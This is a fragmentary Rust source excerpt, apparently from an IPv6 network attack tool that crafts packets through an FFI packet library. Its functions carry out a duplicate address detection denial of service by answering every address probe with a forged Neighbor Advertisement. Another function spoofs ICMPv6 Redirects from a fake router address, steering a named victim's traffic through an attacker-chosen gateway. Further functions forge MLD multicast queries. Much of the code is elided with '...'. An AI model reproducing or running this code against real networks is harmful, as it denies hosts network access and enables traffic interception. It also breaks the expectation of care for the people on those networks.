...
pub async fn dad_dos(cfg: DadDosConfig, stats: Arc<Stats>) -> Result<()> {
    ...
    let filter = CString::new(
        "ip6 and icmp6 and ip6[40] == 135 and ip6 src ::"
    ).unwrap();
    ...
    task::spawn_blocking(move || -> Result<()> {
        ...
        loop {
            ...
            if n > 0 {
                ...
                let mut dst = [0u8; 16];
                dst[0] = 0xff; dst[1] = 0x02; dst[15] = 0x01;
                ...
                unsafe {
                    ...
                    let pkt = ffi::ty_create_ipv6(
                        iface2.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
                        src_ip.as_mut_ptr(), dst.as_mut_ptr(), 255, 0, 0, 0, 0,
                    );
                    if !pkt.is_null() {
                        // Solicited + Override flags
                        let flags: u32 = 0x0600_0000;
                        if ffi::ty_add_icmp6(
                            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORADV, 0, flags,
                            na_buf.as_mut_ptr(), na_buf.len() as i32, 0,
                        ) >= 0 {
                            ffi::ty_send_pkt(
                                iface2.as_ptr(), fake_mac.as_mut_ptr(),
                                dstmac, pkt, &mut pkt_len,
                            );
                            stats2.inc_sent();
                        }
    ...
    task::spawn_blocking(move || -> Result<()> {
        ...
        loop {
            ...
            if n > 0 {
                ...
                let mut na_buf = [0u8; 24];
                unsafe { std::ptr::copy_nonoverlapping(claimed, na_buf.as_mut_ptr(), 16); }
                ...
                unsafe {
                    ...
                    if !pkt.is_null() {
                        ...
                        if ffi::ty_add_icmp6(
                            ...
                            ffi::ty_send_pkt(
                                iface.as_ptr(), fake_mac.as_mut_ptr(),
                                dstmac, pkt, &mut pkt_len,
                            );
                            stats2.inc_sent();
...
pub async fn redirect6(cfg: RedirectConfig, stats: Arc<Stats>) -> Result<()> {
    ...
    let victim_raw: usize = {
        ...
        if p.is_null() { bail!("cannot resolve victim {}", cfg.victim); }
        p as usize
    };
    ...
    let dst_raw: usize = {
        ...
        let p  = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() { bail!("cannot resolve destination {}", cfg.destination); }
        p as usize
    };
    ...
    let gw_raw: usize = if let Some(ref gw) = cfg.new_gateway {
        ...
        let p  = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() { bail!("cannot resolve new_gateway {gw}"); }
        p as usize
    } else {
        unsafe {
            let own = ffi::ty_get_own_ipv6(
                iface.as_ptr(), std::ptr::null_mut(), ffi::PREFER_LINK,
            );
            if own.is_null() { bail!("no link-local IPv6 on {}", cfg.interface); }
            own as usize
        }
    };
...
fn send_one_redirect(
    ...
    router_ip[0] = 0xfe; router_ip[1] = 0x80; router_ip[15] = 0x01;
    ...
    // target = new gateway
    unsafe { std::ptr::copy_nonoverlapping(gw, redir_buf[4..].as_mut_ptr(), 16); }
    // destination = original destination
    unsafe { std::ptr::copy_nonoverlapping(dst, redir_buf[20..].as_mut_ptr(), 16); }
    // TLLA option for new gateway (type=2, len=1)
    redir_buf[36] = 2; redir_buf[37] = 1;
    ...
    unsafe {
        ...
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            router_ip.as_mut_ptr(), victim, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_REDIRECT, 0, 0,
            redir_buf.as_mut_ptr(), redir_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
        ...
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send Redirect rc={rc}"); }
    }
    Ok(())
}
...
fn send_mld1_query(iface: CString, query_interval: u8) -> Result<()> {
    ...
    src_ip[0] = 0xfe; src_ip[1] = 0x80; src_ip[15] = 0x01;
    ...
    unsafe {
        ...
        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_MLD_QUERY, 0, 0,
        ...
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send MLDv1 Query rc={rc}"); }
    }
    Ok(())
}
...
fn send_mld2_query(iface: CString, query_interval: u8) -> Result<()> {
    ...
    unsafe {
        ...
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send MLDv2 Query rc={rc}"); }
    }
    Ok(())
}
